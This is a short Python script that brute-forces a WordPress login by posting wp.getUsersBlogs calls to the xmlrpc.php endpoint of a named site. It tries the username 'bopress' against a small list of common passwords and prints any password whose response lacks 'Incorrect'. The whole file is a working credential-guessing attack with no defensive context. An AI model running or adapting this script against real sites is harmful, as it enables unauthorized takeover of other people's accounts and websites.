import requests

url = "http://www.hydrax.me/xmlrpc.php"

passwords = ['wordpress','admin2','admin','password','password123']

for i in passwords:
   xmldata = """
   <?xml version="1.0" encoding="UTF-8"?>
   <methodCall>
   <methodName>wp.getUsersBlogs</methodName>
   <params>
   <param><value><string>bopress
   </string>
   </value>
   </param>
   <param><value><string>{}
   </string>
   </value>
   </param>
   </params>
   </methodCall>
   """.format(i)

   r = requests.post(url,data=xmldata)
   #print(r.text)
   if not "Incorrect" in r.text:
      print("password found {}".format(i))
      break